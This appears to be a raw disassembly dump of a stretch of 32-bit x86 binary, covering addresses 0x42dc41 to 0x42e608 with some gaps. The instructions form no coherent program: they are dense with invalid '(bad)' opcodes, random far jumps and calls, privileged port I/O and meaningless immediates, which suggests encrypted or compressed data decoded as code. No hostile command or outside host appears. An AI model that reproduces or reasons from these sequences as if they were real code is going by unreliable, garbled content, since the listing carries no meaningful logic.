  42dc41:	jg     0x42dc18
  42dc43:	xor    cl,BYTE PTR [ecx-0x337db735]
  42dc49:	pop    edx
  42dc4a:	cdq    
  42dc4b:	add    al,BYTE PTR [edx-0x14755fd8]
  42dc51:	neg    BYTE PTR [esi+0x3c]
  42dc54:	xchg   esp,eax
  42dc55:	dec    esp
  42dc56:	pop    esi
  42dc57:	pop    es
  42dc58:	push   0xbe4c3160
  42dc5d:	aaa    
  42dc5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc5f:	cmp    eax,edi
  42dc61:	sub    ecx,DWORD PTR [ecx-0x26c522f3]
  42dc67:	sar    BYTE PTR [edx+0x6d885681],1
  42dc6d:	mov    esp,DWORD PTR [ecx+0x5c11b80c]
  42dc73:	sub    ch,ah
  42dc75:	(bad)  
  42dc76:	xchg   edi,eax
  42dc77:	mov    al,0xe9
  42dc79:	inc    eax
  42dc7a:	imul   DWORD PTR [esi+0x431728d1]
  42dc80:	fs scas al,BYTE PTR es:[edi]
  42dc82:	cmp    eax,0x7bb73dda
  42dc87:	retf   0x5c16
  42dc8a:	pop    esp
  42dc8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc8c:	xor    eax,0x513f93
	...
  42dcf1:	add    BYTE PTR [eax],al
  42dcf3:	add    BYTE PTR [ecx],bh
  42dcf5:	mov    bh,0x6d
  42dcf7:	pxor   mm3,mm7
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	dec    edi
  42dd01:	mov    ebp,0xea2cba43
  42dd06:	add    DWORD PTR [eax],eax
  42dd08:	add    al,0x1
  42dd0a:	add    BYTE PTR [eax],al
  42dd0c:	ja     0x42dcd5
  42dd0e:	gs inc eax
  42dd10:	mov    ch,0xb3
  42dd12:	sbb    eax,0x58186eea
  42dd17:	jns    0x42dca3
  42dd19:	out    0x12,al
  42dd1b:	inc    edx
  42dd1c:	ins    DWORD PTR es:[edi],dx
  42dd1d:	mov    esi,0x72cb7e26
  42dd22:	int    0xe9
  42dd24:	in     al,0x97
  42dd26:	cmp    ch,ch
  42dd28:	dec    esi
  42dd29:	sbb    BYTE PTR [ecx+0x4f],bl
  42dd2c:	add    ebp,esp
  42dd2e:	rcl    DWORD PTR [ecx-0x35c34317],1
  42dd34:	dec    eax
  42dd35:	jp     0x42ddad
  42dd37:	pop    eax
  42dd38:	dec    ecx
  42dd39:	fistp  DWORD PTR [ebp-0x51f1076b]
  42dd3f:	sar    DWORD PTR ds:0xd524dbe,1
  42dd45:	jmp    0x475b:0x7835557c
  42dd4c:	jmp    0x42dd39
  42dd4e:	pushf  
  42dd4f:	sub    DWORD PTR [ebp-0x243f7cd1],edi
  42dd55:	clc    
  42dd56:	int    0x63
  42dd58:	sub    ebx,esp
  42dd5a:	pop    esi
  42dd5b:	mov    al,ds:0xd1d71894
  42dd60:	mov    edx,0x39c9660d
  42dd65:	sbb    DWORD PTR [edi],esp
  42dd67:	mov    bl,ah
  42dd69:	adc    ebx,ebx
  42dd6b:	(bad)  
  42dd6c:	jo     0x42ddb9
  42dd6e:	fnstenv [esi]
  42dd70:	and    ah,BYTE PTR [ebx-0x59]
  42dd73:	jns    0x42dd88
  42dd75:	and    DWORD PTR [edi],edi
  42dd77:	inc    edx
  42dd78:	dec    edx
  42dd79:	dec    ecx
  42dd7a:	fstp   TBYTE PTR [edi+0x22]
  42dd7d:	cmp    BYTE PTR [edi+0x7c],dh
  42dd80:	mov    bh,0x7e
  42dd82:	aaa    
  42dd83:	pop    ecx
  42dd84:	shr    BYTE PTR [edx],cl
  42dd86:	xchg   DWORD PTR [ecx+ebp*4],esi
  42dd89:	jo     0x42dd13
  42dd8b:	cli    
  42dd8c:	mov    ebx,0xf74f411
  42dd91:	push   esi
  42dd92:	fistp  QWORD PTR [ebx-0x32]
  42dd95:	push   0x1e
  42dd97:	push   edx
  42dd98:	arpl   WORD PTR [ebx+0x13f1c24a],bx
  42dd9e:	cmp    al,0xa
  42dda0:	xor    BYTE PTR [eax-0x7f9eaa9e],dh
  42dda6:	cwde   
  42dda7:	popa   
  42dda8:	iret   
  42dda9:	sbb    BYTE PTR ds:0xb6faf15e,bl
  42ddaf:	and    dl,BYTE PTR [ecx]
  42ddb1:	or     ch,BYTE PTR [ecx]
  42ddb3:	xchg   ebx,eax
  42ddb4:	sti    
  42ddb5:	mov    ch,0xfd
  42ddb7:	cmp    BYTE PTR [eax-0x27ebe1d6],0x8
  42ddbe:	pop    edx
  42ddbf:	xchg   esp,eax
  42ddc0:	cmp    al,0x6f
  42ddc2:	cs push cs
  42ddc4:	int3   
  42ddc5:	pop    ebp
  42ddc6:	dec    edi
  42ddc7:	call   0x890f:0xe6f67cfe
  42ddce:	in     eax,dx
  42ddcf:	mov    WORD PTR [edx],gs
  42ddd1:	mov    esi,0x895ae5b6
  42ddd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ddd7:	fnstsw ax
  42ddd9:	dec    ecx
  42ddda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dddb:	test   al,0xbf
  42dddd:	push   ds
  42ddde:	or     eax,0xaf3e8e05
  42dde3:	jp     0x42dda5
  42dde5:	int3   
  42dde6:	aas    
  42dde7:	adc    ebx,0x14568f43
  42dded:	imul   DWORD PTR [esi+0x4c]
  42ddf0:	cmp    DWORD PTR [ebp-0x50129d95],edx
  42ddf6:	hlt    
  42ddf7:	lds    ebx,FWORD PTR [ebp+0x4]
  42ddfa:	inc    ebx
  42ddfb:	idiv   DWORD PTR [esi+edi*4+0x75]
  42ddff:	cmp    bh,BYTE PTR [edi+0x23f117b6]
  42de05:	int3   
  42de06:	add    eax,0x8b0ef171
  42de0b:	mov    ebp,eax
  42de0d:	push   esi
  42de0e:	sbb    BYTE PTR [esi+0x0],dh
	...
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	rcl    BYTE PTR [edx-0x14cf97af],0x1
  42de87:	add    BYTE PTR [ecx+eax*1],al
  42de8a:	add    BYTE PTR [eax],al
  42de8c:	adc    bl,dh
  42de8e:	xchg   ecx,eax
  42de8f:	sbb    eax,0x366a7811
  42de94:	mov    al,BYTE PTR [ebp-0x19]
  42de97:	mov    dl,0x1a
  42de99:	sub    eax,0x3007ebca
  42de9e:	mov    dh,0x73
  42dea0:	mov    eax,0x8ccdcdc7
  42dea5:	enter  0xef6b,0x6a
  42dea9:	and    BYTE PTR [edx-0x67],al
  42deac:	xchg   edi,eax
  42dead:	sub    bh,dh
  42deaf:	sbb    BYTE PTR [esi+0x4b0ad6c9],bl
  42deb5:	push   es
  42deb6:	push   ebx
  42deb7:	jae    0x42de45
  42deb9:	dec    ebx
  42deba:	test   ecx,ebx
  42debc:	into   
  42debd:	sub    DWORD PTR [edx-0x38],ecx
  42dec0:	mov    ah,BYTE PTR [ebx+0x2ef3eaf2]
  42dec6:	loope  0x42dee4
  42dec8:	outs   dx,BYTE PTR ds:[esi]
  42dec9:	scas   al,BYTE PTR es:[edi]
  42deca:	dec    eax
  42decb:	push   es
  42decc:	imul   ebx,eax,0x6dad75e
  42ded2:	jmp    0x58b3:0xce7e4d8c
  42ded9:	ins    DWORD PTR es:[edi],dx
  42deda:	lock inc bp
  42dedd:	push   cs
  42dede:	bsf    ebp,DWORD PTR [edi+0x17014cb7]
  42dee5:	push   0xffffffb4
  42dee7:	dec    ecx
  42dee8:	xchg   bh,dh
  42deea:	dec    ebx
  42deeb:	dec    esi
  42deec:	adc    BYTE PTR [edi+ecx*1+0x21],ch
  42def0:	je     0x42df0e
  42def2:	out    0x3b,eax
  42def4:	enter  0x3e4b,0x28
  42def8:	rcr    dl,1
  42defa:	and    esi,esi
  42defc:	shl    DWORD PTR [ebx+0x0],cl
  42deff:	cmp    al,BYTE PTR [eax+eax*8]
  42df02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42df03:	out    dx,eax
  42df04:	lea    ebp,[ecx-0x3613395d]
  42df0a:	dec    edi
  42df0b:	and    bl,BYTE PTR [esp+eax*2-0x55]
  42df0f:	jle    0x42deaa
  42df11:	inc    eax
  42df12:	jecxz  0x42df2c
  42df14:	arpl   WORD PTR [ebx+eiz*1-0x6b],dx
  42df18:	sbb    eax,0xf4583524
  42df1d:	cmp    eax,DWORD PTR [ebp-0x63061ac4]
  42df23:	and    bl,BYTE PTR [esi-0x1c]
  42df26:	ins    DWORD PTR es:[edi],dx
  42df27:	outs   dx,DWORD PTR ds:[esi]
  42df28:	lahf   
  42df29:	xchg   ch,bh
  42df2b:	test   dh,0x6c
  42df2e:	dec    esi
  42df2f:	imul   edi,DWORD PTR [esi-0x2a81f2e3],0xc320eb8
  42df39:	aaa    
  42df3a:	sbb    BYTE PTR ds:0x26c692d2,ah
  42df40:	dec    esp
  42df41:	out    0xd9,eax
  42df43:	outs   dx,BYTE PTR ds:[esi]
  42df44:	mov    cl,0xb8
  42df46:	jge    0x42df6f
  42df48:	mov    gs,WORD PTR [edx+edi*8]
  42df4b:	sbb    DWORD PTR [edi-0x35],ebp
  42df4e:	xchg   ebx,eax
  42df4f:	inc    ebx
  42df50:	push   ds
  42df51:	loop   0x42df07
  42df53:	or     DWORD PTR [ecx],esi
  42df55:	mov    fs,WORD PTR [edx-0x9]
  42df58:	push   ebp
  42df59:	xor    cl,BYTE PTR [eax]
  42df5b:	dec    eax
  42df5c:	mov    BYTE PTR [ecx+0x6c22f16b],al
  42df62:	and    cl,BYTE PTR [esi+0x7de409c2]
  42df68:	aam    0x6e
  42df6a:	into   
  42df6b:	aad    0x8b
  42df6d:	and    al,0x13
  42df6f:	inc    edi
  42df70:	pop    esi
  42df71:	pop    eax
  42df72:	aas    
  42df73:	xlat   BYTE PTR ds:[ebx]
  42df74:	inc    ebx
  42df75:	cs dec esp
  42df77:	test   BYTE PTR [edx],bh
  42df79:	fistp  QWORD PTR [ebx-0x5a]
  42df7c:	jecxz  0x42df2c
  42df7e:	mov    esi,0xb9c3701c
  42df83:	fwait
  42df84:	ret    
  42df85:	rcl    BYTE PTR [ecx-0x23],1
  42df88:	add    BYTE PTR [eax+0x139cdc00],0x2d
  42df8f:	adc    al,0x0
	...
  42dff1:	add    BYTE PTR [eax],al
  42dff3:	add    BYTE PTR [edx],al
  42dff5:	(bad)  
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi-0x2]
  42e001:	jbe    0x42df91
  42e003:	xor    BYTE PTR [esp+ebp*8],0x1
  42e007:	add    BYTE PTR [ecx+eax*1],al
  42e00a:	add    BYTE PTR [eax],al
  42e00c:	ss aas 
  42e00e:	int    0xf4
  42e010:	and    eax,0x303063a7
  42e015:	dec    edx
  42e016:	arpl   WORD PTR [edi-0x453405b2],di
  42e01c:	(bad)  
  42e01d:	mov    ebx,0xb3708528
  42e022:	lock shl BYTE PTR [eax+0x63],cl
  42e026:	fcomp  DWORD PTR ds:0x771c5be1
  42e02c:	mov    eax,0xb46e05f9
  42e031:	inc    ebx
  42e032:	aas    
  42e033:	ins    DWORD PTR es:[edi],dx
  42e034:	mov    ah,BYTE PTR [ecx+ecx*1]
  42e037:	dec    esi
  42e038:	sub    al,0x92
  42e03a:	pop    ebp
  42e03b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e03c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e03d:	rcl    ecx,cl
  42e03f:	repz not DWORD PTR [ebx]
  42e042:	lds    ebp,FWORD PTR [ebx+0x70d4bf00]
  42e048:	add    DWORD PTR [ecx],edx
  42e04a:	test   al,0xd4
  42e04c:	jns    0x42e04b
  42e04e:	xchg   edx,eax
  42e04f:	into   
  42e050:	xchg   edx,eax
  42e051:	(bad)  
  42e052:	sahf   
  42e053:	mov    eax,ds:0x806fccbd
  42e058:	push   esp
  42e059:	jae    0x42e04f
  42e05b:	cmp    DWORD PTR [eax+0x0],edx
  42e05e:	fcom   st(1)
  42e060:	bound  ebx,QWORD PTR [ebp+ecx*8+0x8bdee4f]
  42e067:	mov    bl,0x73
  42e069:	mov    al,0x28
  42e06b:	inc    ebp
  42e06c:	jns    0x42e0e8
  42e06e:	pushf  
  42e06f:	mov    al,ds:0x50e5376e
  42e074:	dec    ebp
  42e075:	(bad)  
  42e076:	stos   DWORD PTR es:[edi],eax
  42e077:	jp     0x42e032
  42e079:	loopne 0x42e021
  42e07b:	test   eax,0x8f2c004b
  42e080:	rol    BYTE PTR [esi],1
  42e082:	mov    DWORD PTR [edx-0x73],0xb42d575d
  42e089:	pop    edi
  42e08a:	jg     0x42e0e4
  42e08c:	ins    DWORD PTR es:[edi],dx
  42e08d:	es dec edx
  42e08f:	or     al,0xfe
  42e091:	mov    ah,0x56
  42e093:	es mov fs,eax
  42e096:	push   cs
  42e097:	push   ebp
  42e098:	imul   esp,DWORD PTR [edi-0x6eb2fde7],0x2c
  42e09f:	jb     0x42e032
  42e0a1:	add    dl,BYTE PTR [ebx+0x4f388aec]
  42e0a7:	ds push esi
  42e0a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e0aa:	sahf   
  42e0ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e0ac:	or     eax,0xc4ef81e9
  42e0b1:	(bad)  
  42e0b2:	and    cl,BYTE PTR [ebx]
  42e0b4:	ss push ebx
  42e0b6:	push   esi
  42e0b7:	push   eax
  42e0b8:	push   ss
  42e0b9:	push   ebp
  42e0ba:	push   ebx
  42e0bb:	popf   
  42e0bc:	cmp    DWORD PTR [ecx],0x8
  42e0bf:	bound  edx,QWORD PTR [ecx-0x1b]
  42e0c2:	je     0x42e10e
  42e0c4:	jae    0x42e145
  42e0c6:	sbb    bl,dh
  42e0c8:	and    eax,0x9637baf7
  42e0cd:	dec    esp
  42e0ce:	sbb    BYTE PTR [edi],dh
  42e0d0:	daa    
  42e0d1:	mov    ch,0x33
  42e0d3:	sbb    ebx,DWORD PTR [ecx+0x39]
  42e0d6:	(bad)  
  42e0d7:	in     al,0x2c
  42e0d9:	rcl    esi,1
  42e0db:	mov    al,ds:0x8dcbcbe0
  42e0e0:	out    0x15,eax
  42e0e2:	ins    DWORD PTR es:[edi],dx
  42e0e3:	shr    DWORD PTR [ebx],1
  42e0e5:	adc    BYTE PTR [esi-0x269e83f1],ah
  42e0eb:	sbb    ebp,DWORD PTR [edx+0x9]
  42e0ee:	adc    eax,0x1d98162c
  42e0f3:	(bad)  
  42e0f4:	repnz sub eax,0xfa538341
  42e0fa:	pop    edi
  42e0fb:	pop    es
  42e0fc:	push   ebp
  42e0fd:	fldcw  WORD PTR [ecx]
  42e0ff:	xchg   ebp,eax
  42e100:	lods   al,BYTE PTR ds:[esi]
  42e101:	pop    es
  42e102:	(bad)  
  42e103:	xor    eax,0x2574d9e7
  42e108:	xor    eax,0x866225cc
  42e10d:	xchg   edx,eax
  42e10e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e10f:	add    BYTE PTR ss:[eax],al
	...
  42e172:	add    BYTE PTR [eax],al
  42e174:	mov    eax,ds:0x7e061ecf
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	aaa    
  42e181:	dec    esp
  42e182:	xchg   ebx,eax
  42e183:	pop    edi
  42e184:	cmp    ch,ch
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    al,0x1
  42e18a:	add    BYTE PTR [eax],al
  42e18c:	in     al,0x95
  42e18e:	nop
  42e18f:	mov    eax,0xf44eeb93
  42e194:	mov    bh,0x2f
  42e196:	cmp    BYTE PTR [edi-0x74a00ba7],bl
  42e19c:	jle    0x42e19d
  42e19e:	frstor [esp+ecx*4-0x74887a99]
  42e1a5:	popa   
  42e1a6:	enter  0x1086,0xd4
  42e1aa:	das    
  42e1ab:	or     DWORD PTR [ebx-0x2889af8b],eax
  42e1b1:	ds cmc 
  42e1b3:	sbb    bl,bh
  42e1b5:	test   DWORD PTR [esi+0x23],ebp
  42e1b8:	pop    ebx
  42e1b9:	inc    esp
  42e1ba:	and    DWORD PTR [ebx],eax
  42e1bc:	adc    bh,BYTE PTR [edi-0x2fb2f148]
  42e1c2:	push   esi
  42e1c3:	mov    edi,0x290421f9
  42e1c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e1c9:	icebp  
  42e1ca:	ja     0x42e226
  42e1cc:	or     edi,DWORD PTR [eax-0x4777d824]
  42e1d2:	jl     0x42e184
  42e1d4:	dec    ebp
  42e1d5:	mov    eax,0xc47e7d3b
  42e1da:	pusha  
  42e1db:	(bad)
  42e1de:	adc    BYTE PTR [ebp-0x6a],bl
  42e1e1:	dec    edi
  42e1e2:	dec    edx
  42e1e3:	dec    ecx
  42e1e4:	neg    BYTE PTR [esi+0x50e46e77]
  42e1ea:	loope  0x42e250
  42e1ec:	add    DWORD PTR [edi+0x1bd0cc67],ebp
  42e1f2:	ret    0x1364
  42e1f5:	or     dl,BYTE PTR [eax+0x7f]
  42e1f8:	ins    DWORD PTR es:[edi],dx
  42e1f9:	jle    0x42e263
  42e1fb:	inc    ebx
  42e1fc:	ja     0x42e1b0
  42e1fe:	cdq    
  42e1ff:	or     al,0xe1
  42e201:	adc    bh,al
  42e203:	(bad)  
  42e204:	cmp    BYTE PTR [edi-0x76],ch
  42e207:	int    0x3a
  42e209:	shl    DWORD PTR [eax+esi*4+0x74432a26],0x8
  42e211:	hlt    
  42e212:	push   cs
  42e213:	dec    ebp
  42e214:	adc    BYTE PTR [ebp-0x3c],cl
  42e217:	dec    ebp
  42e218:	push   es
  42e219:	mov    edi,0x328962a9
  42e21e:	push   esp
  42e21f:	fwait
  42e220:	call   DWORD PTR [eax-0x2f]
  42e223:	mov    cl,0xf
  42e225:	imul   esp,DWORD PTR [esi+0x4f],0x802a8146
  42e22c:	fdiv   st(2),st
  42e22e:	dec    ebx
  42e22f:	or     al,0x66
  42e231:	cmp    eax,DWORD PTR [ecx-0xe828f74]
  42e237:	xchg   edx,eax
  42e238:	lahf   
  42e239:	push   esp
  42e23a:	xor    ebx,DWORD PTR [eax]
  42e23c:	and    al,0x81
  42e23e:	ret    0x9abf
  42e241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e242:	add    ebx,esp
  42e244:	mov    esi,0xa24acec5
  42e249:	hlt    
  42e24a:	dec    eax
  42e24b:	mov    edi,0x68734fea
  42e250:	xor    esi,ebx
  42e252:	mov    dh,dh
  42e254:	push   0x3b
  42e256:	mov    esi,0x5f60736c
  42e25b:	inc    esi
  42e25c:	jmp    0x42e1fa
  42e25e:	leave  
  42e25f:	xchg   edi,eax
  42e260:	xor    al,0xc1
  42e262:	sub    bl,ah
  42e264:	push   0xfffffff7
  42e266:	push   eax
  42e267:	mov    al,cs:0xed3f3a95
  42e26d:	rcr    BYTE PTR [eax],0x78
  42e270:	sbb    DWORD PTR [esi-0x9],eax
  42e273:	or     al,0xd7
  42e275:	jbe    0x42e24e
  42e277:	dec    edi
  42e278:	out    dx,eax
  42e279:	mov    cl,0x3e
  42e27b:	pop    edx
  42e27c:	push   ebp
  42e27d:	and    bl,BYTE PTR [edx]
  42e27f:	xchg   ebp,eax
  42e280:	push   eax
  42e281:	or     DWORD PTR [edi],ebx
  42e283:	pop    ss
  42e284:	cmp    DWORD PTR [esi],esi
  42e286:	outs   dx,DWORD PTR ds:[esi]
  42e287:	(bad)  
  42e288:	js     0x42e2d0
  42e28a:	sbb    BYTE PTR [ebp-0x11],dl
  42e28d:	popa   
  42e28e:	mov    bl,0x26
	...
  42e2f4:	lods   eax,DWORD PTR ds:[esi]
  42e2f5:	cmp    eax,0xb79aa78a
  42e2fa:	lods   eax,DWORD PTR ds:[esi]
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x14199140
  42e301:	ror    edx,1
  42e303:	(bad)  
  42e304:	cmp    al,0xee
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    al,0x1
  42e30a:	add    BYTE PTR [eax],al
  42e30c:	pop    esp
  42e30d:	pusha  
  42e30e:	or     edx,eax
  42e310:	push   ds
  42e311:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e313:	adc    al,0xd3
  42e315:	jp     0x42e34a
  42e317:	or     ecx,DWORD PTR [ecx+esi*1]
  42e31a:	ds jb  0x42e33e
  42e31d:	jl     0x42e2fe
  42e31f:	lods   al,BYTE PTR ds:[esi]
  42e320:	cmp    ecx,eax
  42e322:	ins    DWORD PTR es:[edi],dx
  42e323:	popa   
  42e324:	shr    DWORD PTR [ebp+0x40],0x81
  42e328:	mov    ecx,DWORD PTR [edi]
  42e32a:	adc    al,0xd1
  42e32c:	xchg   edi,eax
  42e32d:	push   edx
  42e32e:	pop    es
  42e32f:	pop    ds
  42e330:	arpl   si,si
  42e332:	hlt    
  42e333:	(bad)  
  42e334:	cwde   
  42e335:	dec    esp
  42e336:	add    ecx,esi
  42e338:	ret    
  42e339:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e33a:	add    al,0x4d
  42e33c:	adc    cl,dl
  42e33e:	stos   DWORD PTR es:[edi],eax
  42e33f:	xor    dl,bl
  42e341:	das    
  42e342:	sub    WORD PTR [ebp-0x5c],0x814c
  42e348:	arpl   WORD PTR [ecx],dx
  42e34a:	cmc    
  42e34b:	(bad)  
  42e34c:	idiv   BYTE PTR [ebp-0x37e168b4]
  42e352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e353:	stos   DWORD PTR es:[edi],eax
  42e354:	dec    ebp
  42e355:	fisubr WORD PTR [ecx-0x3a8ec8be]
  42e35b:	ja     0x42e38e
  42e35d:	pop    eax
  42e35e:	mov    ch,0x51
  42e360:	mov    ds:0xb415444,al
  42e365:	(bad)  
  42e366:	out    0xac,eax
  42e368:	stos   BYTE PTR es:[edi],al
  42e369:	xor    edi,0xb2d7159e
  42e36f:	push   ebp
  42e370:	adc    ecx,DWORD PTR [ebp*4+0x44b595d]
  42e377:	daa    
  42e378:	jmp    0x8436:0x417bd0f5
  42e37f:	cmp    dl,ch
  42e381:	jae    0x42e3c7
  42e383:	in     eax,dx
  42e384:	paddq  mm3,QWORD PTR [ebp+0x4b85942c]
  42e38b:	pop    ds
  42e38c:	leave  
  42e38d:	imul   edi,DWORD PTR [ebx+eax*1-0x2758cfc7],0xebeffb88
  42e398:	and    DWORD PTR [eax],esi
  42e39a:	mov    ah,0x3d
  42e39c:	dec    ebx
  42e39d:	jnp    0x42e352
  42e39f:	mov    eax,ds:0x38a536b8
  42e3a4:	dec    ebp
  42e3a5:	mov    dh,0x1c
  42e3a7:	call   0x296c:0x7f4a236c
  42e3ae:	inc    eax
  42e3af:	push   0xffffffc2
  42e3b1:	sub    ebx,esi
  42e3b3:	ret    0x5241
  42e3b6:	or     cl,BYTE PTR [ecx-0x47]
  42e3b9:	adc    dl,BYTE PTR [ecx-0x1ffe545]
  42e3bf:	add    DWORD PTR [ebx-0xb],ebp
  42e3c2:	xchg   ecx,eax
  42e3c3:	push   cs
  42e3c4:	or     BYTE PTR [ebx-0x18],0xe7
  42e3c8:	adc    DWORD PTR [edi+0x13],0x7e977507
  42e3cf:	cmc    
  42e3d0:	ja     0x42e3b0
  42e3d2:	sbb    al,0x54
  42e3d4:	pop    edi
  42e3d5:	outs   dx,BYTE PTR ds:[esi]
  42e3d6:	lods   eax,DWORD PTR ds:[esi]
  42e3d7:	ficom  DWORD PTR [esi]
  42e3d9:	(bad)  
  42e3db:	lea    edx,[edi-0x3eb4180a]
  42e3e1:	div    BYTE PTR [ecx+esi*4-0x182a5732]
  42e3e8:	outs   dx,BYTE PTR ds:[esi]
  42e3e9:	fnstcw WORD PTR [eax]
  42e3eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e3ec:	inc    esp
  42e3ed:	mov    eax,0xf99c09
  42e3f2:	adc    BYTE PTR [ebx+0x7d4198d2],bl
  42e3f8:	not    BYTE PTR [esi]
  42e3fa:	and    DWORD PTR [eax],ecx
  42e3fc:	sub    dl,BYTE PTR [eax+0x7f]
  42e3ff:	mov    edi,0xcb7973dc
  42e404:	rol    bl,0xe2
  42e407:	pop    edx
  42e408:	or     DWORD PTR fs:[esi],ebp
  42e40b:	and    esp,0x46
  42e40e:	stos   BYTE PTR es:[edi],al
  42e40f:	mov    eax,DWORD PTR [eax]
	...
  42e471:	add    BYTE PTR [eax],al
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	dec    edx
  42e481:	jnp    0x42e470
  42e483:	pop    es
  42e484:	inc    eax
  42e485:	out    dx,eax
  42e486:	add    DWORD PTR [eax],eax
  42e488:	add    al,0x1
  42e48a:	add    BYTE PTR [eax],al
  42e48c:	or     BYTE PTR [edi+0x4c0ad13a],dl
  42e492:	stos   BYTE PTR es:[edi],al
  42e493:	cmp    eax,0xdffbfdcd
  42e498:	and    eax,0x59957da2
  42e49d:	pop    ss
  42e49e:	sub    ebp,ebp
  42e4a0:	jno    0x42e4bf
  42e4a2:	fbstp  TBYTE PTR [eax]
  42e4a4:	or     DWORD PTR [esi],esp
  42e4a6:	inc    ecx
  42e4a7:	jno    0x42e4d0
  42e4a9:	push   ebx
  42e4aa:	(bad)  
  42e4ab:	pop    ebp
  42e4ac:	stos   DWORD PTR es:[edi],eax
  42e4ad:	arpl   WORD PTR [esi+0x74],bx
  42e4b0:	enter  0xcf00,0xdc
  42e4b4:	push   ecx
  42e4b5:	ret    0xaf9f
  42e4b8:	arpl   di,si
  42e4ba:	adc    eax,0x3fed3c4d
  42e4bf:	jl     0x42e48d
  42e4c1:	or     eax,0xe9b41027
  42e4c6:	dec    ebx
  42e4c7:	add    DWORD PTR [eax],0xc2405c40
  42e4cd:	adc    al,0x17
  42e4cf:	or     eax,0xaf66e448
  42e4d4:	(bad)  
  42e4d5:	mov    al,ds:0x5e4a0ca5
  42e4da:	mov    ecx,0xf022a233
  42e4df:	xchg   DWORD PTR [esi],esi
  42e4e1:	ret    
  42e4e2:	jbe    0x42e495
  42e4e4:	mov    ecx,0xaca50c80
  42e4e9:	imul   eax,edi,0x208076e3
  42e4ef:	scas   eax,DWORD PTR es:[edi]
  42e4f0:	repnz fs push ebp
  42e4f3:	mov    WORD PTR [eax+ebx*8-0x2e],es
  42e4f7:	or     esi,DWORD PTR [ebx]
  42e4f9:	out    dx,al
  42e4fa:	(bad)  
  42e4fc:	ja     0x42e49d
  42e4fe:	mov    cl,0x3c
  42e500:	pop    es
  42e501:	test   bh,0x4f
  42e504:	enter  0xc346,0xfa
  42e508:	(bad)  
  42e50a:	mov    ebx,0xabeef295
  42e50f:	in     al,dx
  42e510:	test   BYTE PTR [ebx-0x6b8f9600],ah
  42e516:	imul   eax,DWORD PTR [eax],0xffffffac
  42e519:	pushf  
  42e51a:	das    
  42e51b:	retf   0xf8b9
  42e51e:	gs fsub st(2),st
  42e521:	mov    cl,0x0
  42e523:	ss mov eax,0x876d4793
  42e529:	push   ecx
  42e52a:	dec    ebp
  42e52b:	xchg   ecx,eax
  42e52c:	adc    ebp,DWORD PTR [ebx+0x5e]
  42e52f:	inc    esp
  42e530:	loope  0x42e5ae
  42e532:	adc    BYTE PTR [edx+0x283eae2],cl
  42e538:	lods   al,BYTE PTR ds:[esi]
  42e539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e53a:	xchg   esp,eax
  42e53b:	retf   
  42e53c:	xchg   esi,eax
  42e53d:	rcr    bh,1
  42e53f:	push   ebx
  42e540:	sub    DWORD PTR ds:0xfec7a7fd,ebx
  42e546:	xchg   esp,eax
  42e547:	cmp    BYTE PTR [eax+eiz*2-0x32],al
  42e54b:	cmp    eax,0x9c14de8c
  42e550:	jmp    0x2e54:0xc4baf45e
  42e557:	inc    eax
  42e558:	lock cmp bh,BYTE PTR [edx+eax*2+0x3063c8f3]
  42e560:	(bad)  
  42e561:	jge    0x42e549
  42e563:	leave  
  42e564:	mov    eax,ds:0x89cf2157
  42e569:	in     al,0x6
  42e56b:	(bad)  
  42e56c:	fsubr  QWORD PTR [edx+0x7bd4be7d]
  42e572:	aam    0x8d
  42e574:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e576:	fidiv  WORD PTR [eax+ebx*4]
  42e579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e57a:	and    esi,DWORD PTR [esi+0x4b]
  42e57d:	add    dh,BYTE PTR [eax]
  42e57f:	in     eax,dx
  42e580:	mov    ebp,0x56dffb34
  42e585:	fsub   st(0),st
  42e587:	jo     0x42e607
  42e589:	dec    edi
  42e58a:	adc    eax,0xab80f318
  42e58f:	mov    ch,0x0
	...
  42e5f1:	add    BYTE PTR [eax],al
  42e5f3:	add    BYTE PTR [ebp+0x38],dl
  42e5f6:	into   
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e601:	jp     0x42e588
  42e603:	add    BYTE PTR [eax+esi*8+0x1],0x0
  42e608:	add    al,0x1
